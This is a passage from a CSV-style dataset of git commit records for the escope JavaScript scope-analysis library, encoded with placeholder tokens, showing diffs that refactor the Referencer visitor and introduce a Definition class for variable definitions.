Variable.CatchClause<c><\n>+                        node.param<c><\n>+                        node<c><\n>+                        null<c><\n>+                        null<c><\n>+                        null<\n>+                    ));<\n>+            });<\n>+            this.visit(node.body);<\n>+            this.close(node);<\n>+        }<c><\n>+        Program: function (node) {<\n>+            this.scopeManager.__nestScope(node);<\n>+            if (this.scopeManager.__isES6() && this.scopeManager.isModule()) {<\n>+                this.scopeManager.__nestModuleScope(node);<\n>+            }<\n>+            this.visitChildren(node);<\n>+            this.close(node);<\n>+        }<c><\n>+        Identifier: function (node) {<\n>+            this.currentScope().__referencing(node);<\n>+        }<c><\n>+        UpdateExpression: function (node) {<\n>+            if (isPattern(node)) {<\n>+                this.currentScope().__referencing(node.argument<c> Reference.RW<c> null);<\n>+            } else {<\n>+                this.visitChildren(node);<\n>+            }<\n>+        }<c><\n>+        MemberExpression: function (node) {<\n>+            this.visit(node.object);<\n>+            if (node.computed) {<\n>+                this.visit(node.property);<\n>+            }<\n>+        }<c><\n>+        Property: function (node) {<\n>+            this.visitProperty(node);<\n>+        }<c><\n>+        MethodDefinition: function (node) {<\n>+            this.visitProperty(node);<\n>+        }<c><\n>+        BreakStatement: function () {}<c><\n>+        ContinueStatement: function () {}<c><\n>+        LabelledStatement: function () {}<c><\n>+        ForStatement: function (node) {<\n>+            // Create ForStatement declaration.<\n>+            // NOTE: In ES6<c> ForStatement dynamically generates<\n>+            // per iteration environment. However<c> escope is<\n>+            // a static analyzer<c> we only generate one scope for ForStatement.<\n>+            if (node.init && node.init.type === Syntax.VariableDeclaration && node.init.kind !== 'var') {<\n>+                this.scopeManager.__nestScope(node);<\n>+            }<\n>+            this.visitChildren(node);<\n>+            this.close(node);<\n>+        }<c><\n>+        ClassExpression: function (node) {<\n>+            this.visitClass(node);<\n>+        }<c><\n>+        ClassDeclaration: function (node) {<\n>+            this.visitClass(node);<\n>+        }<c><\n>+        CallExpression: function (node) {<\n>+            // Check this is direct call to eval<\n>+            if (!this.scopeManager.__ignoreEval() && node.callee.type === Syntax.Identifier && node.callee.name === 'eval') {<\n>+                // NOTE: This should be `variableScope`. Since direct eval call always creates Lexical environment and<\n>+                // let / const should be enclosed into it. Only VariableDeclaration affects on the caller's environment.<\n>+                this.currentScope().variableScope.__detectEval();<\n>+            }<\n>+            this.visitChildren(node);<\n>+        }<c><\n>+        BlockStatement: function (node) {<\n>+            if (this.scopeManager.__isES6()) {<\n>+                this.scopeManager.__nestScope(node);<\n>+            }<\n>+            this.visitChildren(node);<\n>+            this.close(node);<\n>+        }<c><\n>+        ThisExpression: function () {<\n>+            this.currentScope().variableScope.__detectThis();<\n>+        }<c><\n>+        WithStatement: function (node) {<\n>+            this.visit(node.object);<\n>+            // Then nest scope for WithStatement.<\n>+            this.scopeManager.__nestScope(node);<\n>+            this.visit(node.body);<\n>+            this.close(node);<\n>+        }<c><\n>+        VariableDeclaration: function (node) {<\n>+            var variableTargetScope<c> i<c> iz<c> decl;<\n>+            variableTargetScope = (node.kind === 'var') ? this.currentScope().variableScope : this.currentScope();<\n>+            for (i = 0<c> iz = node.declarations.length; i < iz; ++i) {<\n>+                decl = node.declarations[i];<\n>+                this.visitVariableDeclaration(variableTargetScope<c> Variable.Variable<c> node<c> i);<\n>+                if (decl.init) {<\n>+                    this.visit(decl.init);<\n>+                }<\n>+            }<\n>+        }<c><\n>+        // sec 13.11.8<\n>+        SwitchStatement: function (node) {<\n>+            var i<c> iz;<\n>+            this.visit(node.discriminant);<\n>+            if (this.scopeManager.__isES6()) {<\n>+                this.scopeManager.__nestScope(node);<\n>+            }<\n>+            for (i = 0<c> iz = node.cases.length; i < iz; ++i) {<\n>+                this.visit(node.cases[i]);<\n>+            }<\n>+            this.close(node);<\n>+        }<c><\n>+        FunctionDeclaration: function (node) {<\n>+            this.visitFunction(node);<\n>+        }<c><\n>+        FunctionExpression: function (node) {<\n>+            this.visitFunction(node);<\n>+        }<c><\n>+        ForOfStatement: function (node) {<\n>+            this.visitForIn(node);<\n>+        }<c><\n>+        ForInStatement: function (node) {<\n>+            this.visitForIn(node);<\n>+        }<c><\n>+        ArrowFunctionExpression: function (node) {<\n>+            this.visitFunction(node);<\n>+        }<c><\n>+        ImportDeclaration: function (node) {<\n>+            var importer;<\n>+            utility.assert(this.scopeManager.__isES6() && this.scopeManager.isModule());<\n>+            importer = new Importer(node<c> this);<\n>+            importer.visit(node);<\n>+        }<c><\n>+        ExportDeclaration: function (node) {<\n>+            if (node.source) {<\n>+                return;<\n>+            }<\n>+            if (node.declaration) {<\n>+                this.visit(node.declaration);<\n>+                return;<\n>+            }<\n>+            this.visitChildren(node);<\n>+        }<c><\n>+        ExportSpecifier: function (node) {<\n>+            this.visit(node.id);<\n>+        }<\n>+    });<\n>+    module.exports = Referencer;<\n>+/* vim: set sw=4 ts=4 et tw=80 : */<\n>",-    var Syntax<c><\n>-        Reference<c><\n>-        Variable<c><\n>-        Definition<c><\n>-        Scope<c><\n>-        ScopeManager<c><\n>-        util<c><\n>-        utility<c><\n>-        objectAssign<c><\n>-        estraverse<c><\n>-        esrecurse;<\n>-    util = require('util');<\n>-    objectAssign = require('object-assign');<\n>-    estraverse = require('estraverse');<\n>-    esrecurse = require('esrecurse');<\n>-    Syntax = estraverse.Syntax;<\n>-    Reference = require('./reference');<\n>-    Variable = require('./variable');<\n>-    Definition = require('./definition');<\n>-    Scope = require('./scope');<\n>-    function traverseIdentifierInPattern(rootPattern<c> callback) {<\n>-        estraverse.traverse(rootPattern<c> {<\n>-            enter: function (pattern<c> parent) {<\n>-                var i<c> iz<c> element<c> property;<\n>-                switch (pattern.type) {<\n>-                    case Syntax.Identifier:<\n>-                        // Toplevel identifier.<\n>-                        if (parent === null) {<\n>-                            callback(pattern<c> true);<\n>-                        }<\n>-                        break;<\n>-                    case Syntax.SpreadElement:<\n>-                        if (pattern.argument.type === Syntax.Identifier) {<\n>-                            callback(pattern.argument<c> false);<\n>-                        }<\n>-                        break;<\n>-                    case Syntax.ObjectPattern:<\n>-                        for (i = 0<c> iz = pattern.properties.length; i < iz; ++i) {<\n>-                            property = pattern.properties[i];<\n>-                            if (property.shorthand) {<\n>-                                callback(property.key<c> false);<\n>-                                continue;<\n>-                            }<\n>-                            if (property.value.type === Syntax.Identifier) {<\n>-                                callback(property.value<c> false);<\n>-                                continue;<\n>-                            }<\n>-                        }<\n>-                        break;<\n>-                    case Syntax.ArrayPattern:<\n>-                        for (i = 0<c> iz = pattern.elements.length; i < iz; ++i) {<\n>-                            element = pattern.elements[i];<\n>-                            if (element && element.type === Syntax.Identifier) {<\n>-                                callback(element<c> false);<\n>-                            }<\n>-                        }<\n>-                        break;<\n>-                }<\n>-            }<\n>-        });<\n>-    }<\n>-    function isPattern(node) {<\n>-        var nodeType = node.type;<\n>-        return nodeType === Syntax.Identifier || nodeType === Syntax.ObjectPattern || nodeType === Syntax.ArrayPattern || nodeType === Syntax.SpreadElement;<\n>-    }<\n>-    // Importing ImportDeclaration.<\n>-    // http://people.mozilla.org/~jorendorff/es6-draft.html#sec-moduledeclarationinstantiation<\n>-    // FIXME: Now<c> we don't create module environment<c> because the context is<\n>-    // implementation dependent.<\n>-    function Importer(declaration<c> referencer) {<\n>-        esrecurse.Visitor.call(this<c> this);<\n>-        this.declaration = declaration;<\n>-        this.referencer = referencer;<\n>-    }<\n>-    util.inherits(Importer<c> esrecurse.Visitor);<\n>-    objectAssign(Importer.prototype<c> {<\n>-        visitImport: function (id<c> specifier) {<\n>-            var that = this;<\n>-            that.referencer.visitPattern(id<c> function (pattern) {<\n>-                that.referencer.currentScope().__define(pattern<c><\n>-                    new Definition(<\n>-                        Variable.ImportBinding<c><\n>-                        pattern<c><\n>-                        specifier<c><\n>-                        that.declaration<c><\n>-                        null<c><\n>-                        null<\n>-                        ));<\n>-            });<\n>-        }<c><\n>-        ImportNamespaceSpecifier: function (node) {<\n>-            if (node.id) {<\n>-                this.visitImport(node.id<c> node);<\n>-            }<\n>-        }<c><\n>-        ImportDefaultSpecifier: function (node) {<\n>-            this.visitImport(node.id<c> node);<\n>-        }<c><\n>-        ImportSpecifier: function (node) {<\n>-            if (node.name) {<\n>-                this.visitImport(node.name<c> node);<\n>-            } else {<\n>-                this.visitImport(node.id<c> node);<\n>-            }<\n>-        }<\n>-    });<\n>-    // Referencing variables and creating bindings.<\n>-    function Referencer(scopeManager) {<\n>-        esrecurse.Visitor.call(this<c> this);<\n>-        this.scopeManager = scopeManager;<\n>-        this.parent = null;<\n>-        this.isInnerMethodDefinition = false;<\n>-    }<\n>-    util.inherits(Referencer<c> esrecurse.Visitor);<\n>-    objectAssign(Referencer.prototype<c> {<\n>-        currentScope: function () {<\n>-            return this.scopeManager.__currentScope;<\n>-        }<c><\n>-        close: function (node) {<\n>-            while (this.currentScope() && node === this.currentScope().block) {<\n>-                this.currentScope().__close(this.scopeManager);<\n>-            }<\n>-        }<c><\n>-        pushInnerMethodDefinition: function (isInnerMethodDefinition) {<\n>-            var previous = this.isInnerMethodDefinition;<\n>-            this.isInnerMethodDefinition = isInnerMethodDefinition;<\n>-            return previous;<\n>-        }<c><\n>-        popInnerMethodDefinition: function (isInnerMethodDefinition) {<\n>-            this.isInnerMethodDefinition = isInnerMethodDefinition;<\n>-        }<c><\n>-        materializeTDZScope: function (node<c> iterationNode) {<\n>-            // http://people.mozilla.org/~jorendorff/es6-draft.html#sec-runtime-semantics-forin-div-ofexpressionevaluation-abstract-operation<\n>-            // TDZ scope hides the declaration's names.<\n>-            this.scopeManager.__nestTDZScope(node<c> iterationNode);<\n>-            this.visitVariableDeclaration(this.currentScope()<c> Variable.TDZ<c> iterationNode.left<c> 0);<\n>-        }<c><\n>-        materializeIterationScope: function (node) {<\n>-            // Generate iteration scope for upper ForIn/ForOf Statements.<\n>-            // parent node for __nestScope is only necessary to<\n>-            // distinguish MethodDefinition.<\n>-            var letOrConstDecl<c> that = this;<\n>-            this.scopeManager.__nestScope(node<c> false);<\n>-            letOrConstDecl = node.left;<\n>-            this.visitVariableDeclaration(this.currentScope()<c> Variable.Variable<c> letOrConstDecl<c> 0);<\n>-            this.visitPattern(letOrConstDecl.declarations[0].id<c> function (pattern) {<\n>-                that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>-            });<\n>-        }<c><\n>-        visitPattern: function (node<c> callback) {<\n>-            traverseIdentifierInPattern(node<c> callback);<\n>-        }<c><\n>-        visitFunction: function (node) {<\n>-            var i<c> iz<c> that = this;<\n>-            // FunctionDeclaration name is defined in upper scope<\n>-            // NOTE: Not referring variableScope. It is intended.<\n>-            // Since<\n>-            //  in ES5<c> FunctionDeclaration should be in FunctionBody.<\n>-            //  in ES6<c> FunctionDeclaration should be block scoped.<\n>-            if (node.type === Syntax.FunctionDeclaration) {<\n>-                // id is defined in upper scope<\n>-                this.currentScope().__define(node.id<c><\n>-                        new Definition(<\n>-                            Variable.FunctionName<c><\n>-                            node.id<c><\n>-                            node<c><\n>-                            null<c><\n>-                            null<c><\n>-                            null<\n>-                        ));<\n>-            }<\n>-            // Consider this function is in the MethodDefinition.<\n>-            this.scopeManager.__nestScope(node<c> this.isInnerMethodDefinition);<\n>-            for (i = 0<c> iz = node.params.length; i < iz; ++i) {<\n>-                this.visitPattern(node.params[i]<c> function (pattern) {<\n>-                    that.currentScope().__define(pattern<c><\n>-                        new Definition(<\n>-                            Variable.Parameter<c><\n>-                            pattern<c><\n>-                            node<c><\n>-                            null<c><\n>-                            i<c><\n>-                            null<\n>-                        ));<\n>-                });<\n>-            }<\n>-            // Skip BlockStatement to prevent creating BlockStatement scope.<\n>-            if (node.body.type === Syntax.BlockStatement) {<\n>-                this.visitChildren(node.body);<\n>-            } else {<\n>-                this.visit(node.body);<\n>-            }<\n>-            this.close(node);<\n>-        }<c><\n>-        visitClass: function (node) {<\n>-            if (node.type === Syntax.ClassDeclaration) {<\n>-                this.currentScope().__define(node.id<c><\n>-                        new Definition(<\n>-                            Variable.ClassName<c><\n>-                            node.id<c><\n>-                            node<c><\n>-                            null<c><\n>-                            null<c><\n>-                            null<\n>-                        ));<\n>-            }<\n>-            // FIXME: Maybe consider TDZ.<\n>-            this.visit(node.superClass);<\n>-            this.scopeManager.__nestScope(node);<\n>-            if (node.id) {<\n>-                this.currentScope().__define(node.id<c><\n>-                        new Definition(<\n>-                            Variable.ClassName<c><\n>-                            node.id<c><\n>-                            node<\n>-                        ));<\n>-            }<\n>-            this.visit(node.body);<\n>-            this.close(node);<\n>-        }<c><\n>-        visitProperty: function (node) {<\n>-            var previous<c> isMethodDefinition;<\n>-            if (node.computed) {<\n>-                this.visit(node.key);<\n>-            }<\n>-            isMethodDefinition = node.type === Syntax.MethodDefinition || node.method;<\n>-            if (isMethodDefinition) {<\n>-                previous = this.pushInnerMethodDefinition(true);<\n>-            }<\n>-            this.visit(node.value);<\n>-            if (isMethodDefinition) {<\n>-                this.popInnerMethodDefinition(previous);<\n>-            }<\n>-        }<c><\n>-        visitForIn: function (node) {<\n>-            var that = this;<\n>-            if (node.left.type === Syntax.VariableDeclaration && node.left.kind !== 'var') {<\n>-                this.materializeTDZScope(node.right<c> node);<\n>-                this.visit(node.right);<\n>-                this.close(node.right);<\n>-                this.materializeIterationScope(node);<\n>-                this.visit(node.body);<\n>-                this.close(node);<\n>-            } else {<\n>-                if (node.left.type === Syntax.VariableDeclaration) {<\n>-                    this.visit(node.left);<\n>-                    this.visitPattern(node.left.declarations[0].id<c> function (pattern) {<\n>-                        that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>-                    });<\n>-                } else {<\n>-                    if (!isPattern(node.left)) {<\n>-                        this.visit(node.left);<\n>-                    }<\n>-                    this.visitPattern(node.left<c> function (pattern) {<\n>-                        var maybeImplicitGlobal = null;<\n>-                        if (!that.currentScope().isStrict) {<\n>-                            maybeImplicitGlobal = {<\n>-                                pattern: pattern<c><\n>-                                node: node<\n>-                            };<\n>-                        }<\n>-                        that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> true);<\n>-                    });<\n>-                }<\n>-                this.visit(node.right);<\n>-                this.visit(node.body);<\n>-            }<\n>-        }<c><\n>-        visitVariableDeclaration: function (variableTargetScope<c> type<c> node<c> index) {<\n>-            var decl<c> init<c> that = this;<\n>-            decl = node.declarations[index];<\n>-            init = decl.init;<\n>-            // FIXME: Don't consider initializer with complex patterns.<\n>-            // Such as<c><\n>-            // var [a<c> b<c> c = 20] = array;<\n>-            this.visitPattern(decl.id<c> function (pattern<c> toplevel) {<\n>-                variableTargetScope.__define(pattern<c><\n>-                    new Definition(<\n>-                        type<c><\n>-                        pattern<c><\n>-                        decl<c><\n>-                        node<c><\n>-                        index<c><\n>-                        node.kind<\n>-                    ));<\n>-                if (init) {<\n>-                    that.currentScope().__referencing(pattern<c> Reference.WRITE<c> init<c> null<c> !toplevel);<\n>-                }<\n>-            });<\n>-        }<c><\n>-        AssignmentExpression: function (node) {<\n>-            var that = this;<\n>-            if (isPattern(node.left)) {<\n>-                if (node.operator === '=') {<\n>-                    this.visitPattern(node.left<c> function (pattern<c> toplevel) {<\n>-                        var maybeImplicitGlobal = null;<\n>-                        if (!that.currentScope().isStrict) {<\n>-                            maybeImplicitGlobal = {<\n>-                                pattern: pattern<c><\n>-                                node: node<\n>-                            };<\n>-                        }<\n>-                        that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> !toplevel);<\n>-                    });<\n>-                } else {<\n>-                    that.currentScope().__referencing(node.left<c> Reference.RW<c> node.right);<\n>-                }<\n>-            } else {<\n>-                this.visit(node.left);<\n>-            }<\n>-            this.visit(node.right);<\n>-        }<c><\n>-        CatchClause: function (node) {<\n>-            var that = this;<\n>-            this.scopeManager.__nestScope(node);<\n>-            this.visitPattern(node.param<c> function (pattern) {<\n>-                that.currentScope().__define(pattern<c><\n>-                    new Definition(<\n>-                        Variable.CatchClause<c><\n>-                        node.param<c><\n>-                        node<c><\n>-                        null<c><\n>-                        null<c><\n>-                        null<\n>-                    ));<\n>-            });<\n>-            this.visit(node.body);<\n>-            this.close(node);<\n>-        }<c><\n>-        Program: function (node) {<\n>-            this.scopeManager.__nestScope(node);<\n>-            if (this.scopeManager.__isES6() && this.scopeManager.isModule()) {<\n>-                this.scopeManager.__nestModuleScope(node);<\n>-            }<\n>-            this.visitChildren(node);<\n>-            this.close(node);<\n>-        }<c><\n>-        Identifier: function (node) {<\n>-            this.currentScope().__referencing(node);<\n>-        }<c><\n>-        UpdateExpression: function (node) {<\n>-            if (isPattern(node)) {<\n>-                this.currentScope().__referencing(node.argument<c> Reference.RW<c> null);<\n>-            } else {<\n>-                this.visitChildren(node);<\n>-            }<\n>-        }<c><\n>-        MemberExpression: function (node) {<\n>-            this.visit(node.object);<\n>-            if (node.computed) {<\n>-                this.visit(node.property);<\n>-            }<\n>-        }<c><\n>-        Property: function (node) {<\n>-            this.visitProperty(node);<\n>-        }<c><\n>-        MethodDefinition: function (node) {<\n>-            this.visitProperty(node);<\n>-        }<c><\n>-        BreakStatement: function () {}<c><\n>-        ContinueStatement: function () {}<c><\n>-        LabelledStatement: function () {}<c><\n>-        ForStatement: function (node) {<\n>-            // Create ForStatement declaration.<\n>-            // NOTE: In ES6<c> ForStatement dynamically generates<\n>-            // per iteration environment. However<c> escope is<\n>-            // a static analyzer<c> we only generate one scope for ForStatement.<\n>-            if (node.init && node.init.type === Syntax.VariableDeclaration && node.init.kind !== 'var') {<\n>-                this.scopeManager.__nestScope(node);<\n>-            }<\n>-            this.visitChildren(node);<\n>-            this.close(node);<\n>-        }<c><\n>-        ClassExpression: function (node) {<\n>-            this.visitClass(node);<\n>-        }<c><\n>-        ClassDeclaration: function (node) {<\n>-            this.visitClass(node);<\n>-        }<c><\n>-        CallExpression: function (node) {<\n>-            // Check this is direct call to eval<\n>-            if (!this.scopeManager.__ignoreEval() && node.callee.type === Syntax.Identifier && node.callee.name === 'eval') {<\n>-                // NOTE: This should be `variableScope`. Since direct eval call always creates Lexical environment and<\n>-                // let / const should be enclosed into it. Only VariableDeclaration affects on the caller's environment.<\n>-                this.currentScope().variableScope.__detectEval();<\n>-            }<\n>-            this.visitChildren(node);<\n>-        }<c><\n>-        BlockStatement: function (node) {<\n>-            if (this.scopeManager.__isES6()) {<\n>-                this.scopeManager.__nestScope(node);<\n>-            }<\n>-            this.visitChildren(node);<\n>-            this.close(node);<\n>-        }<c><\n>-        ThisExpression: function () {<\n>-            this.currentScope().variableScope.__detectThis();<\n>-        }<c><\n>-        WithStatement: function (node) {<\n>-            this.visit(node.object);<\n>-            // Then nest scope for WithStatement.<\n>-            this.scopeManager.__nestScope(node);<\n>-            this.visit(node.body);<\n>-            this.close(node);<\n>-        }<c><\n>-        VariableDeclaration: function (node) {<\n>-            var variableTargetScope<c> i<c> iz<c> decl;<\n>-            variableTargetScope = (node.kind === 'var') ? this.currentScope().variableScope : this.currentScope();<\n>-            for (i = 0<c> iz = node.declarations.length; i < iz; ++i) {<\n>-                decl = node.declarations[i];<\n>-                this.visitVariableDeclaration(variableTargetScope<c> Variable.Variable<c> node<c> i);<\n>-                if (decl.init) {<\n>-                    this.visit(decl.init);<\n>-                }<\n>-            }<\n>-        }<c><\n>-        // sec 13.11.8<\n>-        SwitchStatement: function (node) {<\n>-            var i<c> iz;<\n>-            this.visit(node.discriminant);<\n>-            if (this.scopeManager.__isES6()) {<\n>-                this.scopeManager.__nestScope(node);<\n>-            }<\n>-            for (i = 0<c> iz = node.cases.length; i < iz; ++i) {<\n>-                this.visit(node.cases[i]);<\n>-            }<\n>-            this.close(node);<\n>-        }<c><\n>-        FunctionDeclaration: function (node) {<\n>-            this.visitFunction(node);<\n>-        }<c><\n>-        FunctionExpression: function (node) {<\n>-            this.visitFunction(node);<\n>-        }<c><\n>-        ForOfStatement: function (node) {<\n>-            this.visitForIn(node);<\n>-        }<c><\n>-        ForInStatement: function (node) {<\n>-            this.visitForIn(node);<\n>-        }<c><\n>-        ArrowFunctionExpression: function (node) {<\n>-            this.visitFunction(node);<\n>-        }<c><\n>-        ImportDeclaration: function (node) {<\n>-            var importer;<\n>-            utility.assert(this.scopeManager.__isES6() && this.scopeManager.isModule());<\n>-            importer = new Importer(node<c> this);<\n>-            importer.visit(node);<\n>-        }<c><\n>-        ExportDeclaration: function (node) {<\n>-            if (node.source) {<\n>-                return;<\n>-            }<\n>-            if (node.declaration) {<\n>-                this.visit(node.declaration);<\n>-                return;<\n>-            }<\n>-            this.visitChildren(node);<\n>-        }<c><\n>-        ExportSpecifier: function (node) {<\n>-            this.visit(node.id);<\n>-        }<\n>-    });<\n>-    exports.Reference = Reference;<\n>-    exports.Variable = Variable;<\n>-    exports.Scope = Scope;<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,4,36,1 Jan 2015,Introduce Definition class,0,1,3,226,9463,"+/*<\n>+  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+  Redistribution and use in source and binary forms<c> with or without<\n>+  modification<c> are permitted provided that the following conditions are met:<\n>+    * Redistributions of source code must retain the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer.<\n>+    * Redistributions in binary form must reproduce the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer in the<\n>+      documentation and/or other materials provided with the distribution.<\n>+  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+*/<\n>+(function () {<\n>+    'use strict';<\n>+    /**<\n>+     * @class Definition<\n>+     */<\n>+    function Definition(type<c> name<c> node<c> parent<c> index<c> kind) {<\n>+        /**<\n>+         * @member {String} Definition#type - type of the occurrence (e.g. ""Parameter""<c> ""Variable""<c> ...).<\n>+         */<\n>+        this.type = type;<\n>+        /**<\n>+         * @member {esprima.Identifier} Definition#name - the identifier AST node of the occurrence.<\n>+         */<\n>+        this.name = name;<\n>+        /**<\n>+         * @member {esprima.Node} Definition#node - the enclosing node of the identifier.<\n>+         */<\n>+        this.node = node;<\n>+        /**<\n>+         * @member {esprima.Node?} Definition#parent - the enclosing statement node of the identifier.<\n>+         */<\n>+        this.parent = parent;<\n>+        /**<\n>+         * @member {Number?} Definition#index - the index in the declaration statement.<\n>+         */<\n>+        this.index = index;<\n>+        /**<\n>+         * @member {String?} Definition#kind - the kind of the declaration statement.<\n>+         */<\n>+        this.kind = kind;<\n>+    }<\n>+    module.exports = Definition;<\n>+/* vim: set sw=4 ts=4 et tw=80 : */<\n>+        Definition<c><\n>+    Definition = require('./definition');<\n>+                that.referencer.currentScope().__define(pattern<c><\n>+                    new Definition(<\n>+                        Variable.ImportBinding<c><\n>+                        pattern<c><\n>+                        specifier<c><\n>+                        that.declaration<c><\n>+                        null<c><\n>+                        null<\n>+                        ));<\n>+                this.currentScope().__define(node.id<c><\n>+                        new Definition(<\n>+                            Variable.FunctionName<c><\n>+                            node.id<c><\n>+                            node<c><\n>+                            null<c><\n>+                            null<c><\n>+                            null<\n>+                        ));<\n>+                    that.currentScope().__define(pattern<c><\n>+                        new Definition(<\n>+                            Variable.Parameter<c><\n>+                            pattern<c><\n>+                            node<c><\n>+                            null<c><\n>+                            i<c><\n>+                            null<\n>+                        ));<\n>+                this.currentScope().__define(node.id<c><\n>+                        new Definition(<\n>+                            Variable.ClassName<c><\n>+                            node.id<c><\n>+                            node<c><\n>+                            null<c><\n>+                            null<c><\n>+                            null<\n>+                        ));<\n>+                this.currentScope().__define(node.id<c><\n>+                        new Definition(<\n>+                            Variable.ClassName<c><\n>+                            node.id<c><\n>+                            node<\n>+                        ));<\n>+                variableTargetScope.__define(pattern<c><\n>+                    new Definition(<\n>+                        type<c><\n>+                        pattern<c><\n>+                        decl<c><\n>+                        node<c><\n>+                        index<c><\n>+                        node.kind<\n>+                    ));<\n>+                that.currentScope().__define(pattern<c><\n>+                    new Definition(<\n>+                        Variable.CatchClause<c><\n>+                        node.param<c><\n>+                        node<c><\n>+                        null<c><\n>+                        null<c><\n>+                        null<\n>+                    ));<\n>+        Definition<c><\n>+    Definition = require('./definition');<\n>+            this.__define(block.id<c><\n>+                    new Definition(<\n>+                        Variable.FunctionName<c><\n>+                        block.id<c><\n>+                        block<c><\n>+                        null<c><\n>+                        null<c><\n>+                        null<\n>+                    ));<\n>+                this.__defineImplicit(info.pattern<c><\n>+                        new Definition(<\n>+                            Variable.ImplicitGlobalVariable<c><\n>+                            info.pattern<c><\n>+                            info.node<c><\n>+                            null<c><\n>+                            null<c><\n>+                            null<\n>+                        ));<\n>+    Scope.prototype.__defineGeneric = function (name<c> set<c> variables<c> node<c> def) {<\n>+        if (def) {<\n>+            variable.defs.push(def);<\n>+        this.__defineGeneric(<\n>+                'arguments'<c><\n>+                this.set<c><\n>+                this.variables<c><\n>+                null<c><\n>+                null);<\n>+    Scope.prototype.__defineImplicit = function (node<c> def) {<\n>+            this.__defineGeneric(<\n>+                    node.name<c><\n>+                    this.implicit.set<c><\n>+                    this.implicit.variables<c><\n>+                    node<c><\n>+                    def);<\n>+    Scope.prototype.__define = function (node<c> def) {<\n>+            this.__defineGeneric(<\n>+                    node.name<c><\n>+                    this.set<c><\n>+                    this.variables<c><\n>+                    node<c><\n>+                    def);<\n>+         * @member {Definition[]} Variable#defs<\n>","-                that.referencer.currentScope().__define(pattern<c> {<\n>-                    type: Variable.ImportBinding<c><\n>-                    name: pattern<c><\n>-                    node: specifier<c><\n>-                    parent: that.declaration<\n>-                });<\n>-                this.currentScope().__define(node.id<c> {<\n>-                    type: Variable.FunctionName<c><\n>-                    name: node.id<c><\n>-                    node: node<\n>-                });<\n>-                    that.currentScope().__define(pattern<c> {<\n>-                        type: Variable.Parameter<c><\n>-                        name: pattern<c><\n>-                        node: node<c><\n>-                        index: i<\n>-                    });<\n>-                this.currentScope().__define(node.id<c> {<\n>-                    type: Variable.ClassName<c><\n>-                    name: node.id<c><\n>-                    node: node<\n>-                });<\n>-                this.currentScope().__define(node.id<c> {<\n>-                    type: Variable.ClassName<c><\n>-                    name: node.id<c><\n>-                    node: node<\n>-                });<\n>-                variableTargetScope.__define(pattern<c> {<\n>-                    type: type<c><\n>-                    name: pattern<c><\n>-                    node: decl<c><\n>-                    index: index<c><\n>-                    kind: node.kind<c><\n>-                    parent: node<\n>-                });<\n>-                that.currentScope().__define(pattern<c> {<\n>-                    type: Variable.CatchClause<c><\n>-                    name: node.param<c><\n>-                    node: node<\n>-                });<\n>-            this.__define(block.id<c> {<\n>-                type: Variable.FunctionName<c><\n>-                name: block.id<c><\n>-                node: block<\n>-            });<\n>-                this.__defineImplicit(info.pattern<c> {<\n>-                    type: Variable.ImplicitGlobalVariable<c><\n>-                    name: info.pattern<c><\n>-                    node: info.node<\n>-                });<\n>-    Scope.prototype.__defineGeneric = function (name<c> set<c> variables<c> node<c> info) {<\n>-        if (info) {<\n>-            variable.defs.push(info);<\n>-        this.__defineGeneric('arguments'<c> this.set<c> this.variables);<\n>-    Scope.prototype.__defineImplicit = function (node<c> info) {<\n>-            this.__defineGeneric(node.name<c> this.implicit.set<c> this.implicit.variables<c> node<c> info);<\n>-    Scope.prototype.__define = function (node<c> info) {<\n>-            this.__defineGeneric(node.name<c> this.set<c> this.variables<c> node<c> info);<\n>-         * @typedef {Object} DefEntry<\n>-         * @property {String} DefEntry.type - the type of the occurrence (e.g.<\n>-         *      ""Parameter""<c> ""Variable""<c> ...)<\n>-         * @property {esprima.Identifier} DefEntry.name - the identifier AST node of the occurrence<\n>-         * @property {esprima.Node} DefEntry.node - the enclosing node of the<\n>-         *      identifier<\n>-         * @property {esprima.Node} [DefEntry.parent] - the enclosing statement<\n>-         *      node of the identifier<\n>-         * @member {DefEntry[]} Variable#defs<\n>",F
